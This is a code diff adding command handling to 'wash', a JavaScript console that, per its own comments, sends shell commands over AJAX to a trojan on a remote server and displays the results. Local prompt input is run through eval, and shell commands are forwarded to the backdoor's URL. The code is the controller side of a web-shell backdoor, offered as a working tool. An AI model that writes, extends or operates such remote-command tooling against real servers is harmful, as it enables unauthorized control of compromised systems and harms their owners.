@@ -4,5 +4,42 @@ var wash = {
     // store the version number (sometimes this is handy)
     version: '1.0.0',
 
-    // object that encapsulates command-related functionality
+    // processes commands on the wash prompt
+    process: function(command){
+        // parse out the wash action
+        if(shell.prompt.mode.get() == 'wash'){
+            // process wash commands as pure JavaScript. This allows for
+            // some tremendous extensibility
+            try{
+                eval(command);
+            }catch(e){
+                wash.response.prompt_context = shell.prompt.context.get();
+                wash.response.output         = 'wash error: Invalid command.'
+                shell.output.write(wash.response.output , 'wash_error');
+            }
+        }
+        
+        // if the prompt is not in wash mode, default to shell action
+        else {
+            wash.command.action = 'shell';
+            wash.command.cmd    = command;
+            //wash.command.crypto.encrypt();
+            wash.send_and_receive();
+        }
+    },
+
+    // sends a command to the trojan
+    send_and_receive: function(){
+        // make the AJAX request to the trojan
+        $.ajax({
+            type : wash.connection.request_type,
+            url  : wash.connection.protocol + '://' + wash.connection.url,
+            data : wash.command,
+        }).done(function(response){
+            wash.response = JSON.parse(response);
+            var output_class = 'blah';
+            shell.prompt.context.set(wash.response.prompt_context);
+            shell.output.write(wash.response.output , 'output ' + output_class);
+        });
+    }
 }
